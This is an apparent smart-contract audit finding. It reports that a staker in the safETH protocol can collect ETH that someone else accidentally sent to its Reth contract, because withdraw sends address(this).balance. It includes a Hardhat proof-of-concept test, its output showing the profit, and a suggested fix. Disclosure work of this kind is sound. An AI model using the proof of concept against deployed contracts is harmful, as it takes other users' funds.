## [H 01]  Staking user can steal  ETH if a user  accidently sends ETH to Reth contract 


1. Bob stake 1 ether in safETH contract
2. Alice accidently send  5 eth to Reth contract 
3. Bob call unstake with  1 ether 
4. Bob make a profit total of   near to 4.99 ETH

## Proof of Concept

```js

it("USER1   STAKE 1 ether " , async function () {
  console.log( "BEFORE : %s " , await user.getBalance())
        const a = ethers.utils.parseEther("1")
     const  s = await safEthProxy.connect(user).stake( {value: a }   )
    await s.wait();
})
    // it('owner configured correctly', async () => {
    //   expect(await safEthProxy.owner()).to.be.equal(adminAccount.address);
    //   });
it("USer2 accidently send  5  ETH to Reth contract " ,async function () {
   const txHash = await user2.sendTransaction({
        to: RETH.address,
        value: ethers.utils.parseEther("5.0"),
      });
         await txHash.wait();
})
it ("User1 get more ETH in return than  deposit ", async function () {
        const  t = await safEthProxy.connect(user).unstake(ethers.utils.parseEther("1"))
         await t.wait();
         console.log("AFTER : %s" , await user.getBalance())
} )


```

```js

BEFORE  : 10000000000000000000000 
TSUPPLY :  0
totalStakeValueEth : 0 
DEPOSITNG AMOUNTS : 311470004114065856
DEPOSITNG AMOUNTS : 323752733947923294
DEPOSITNG AMOUNTS : 298850877638830985
MINT : 1000099346145738018
      ✓ USER1   STAKE 1 ether 
      ✓ USer2 accidently send  2  ETH to Reth contract 
ETHER RECeived : 5331157192527934898 
ETHER RECeived : 332871277625082104 
ETHER RECeived : 332897726813378202 

AFTER : 10004990535004996312724
      ✓ User1 get more ETH in return than  deposit 


```

This is because   
```js
function withdraw(uint256 amount) external onlyOwner {
        RocketTokenRETHInterface(rethAddress()).burn(amount);
        // solhint-disable-next-line
        (bool sent, ) = address(msg.sender).call{value: address(this).balance}("");
```



####  Mitigation steps

Don't  use address(this).balance to calculate the withdraw amount  use another solidity pattern  to tranfer the Eth back to  safETH contract 
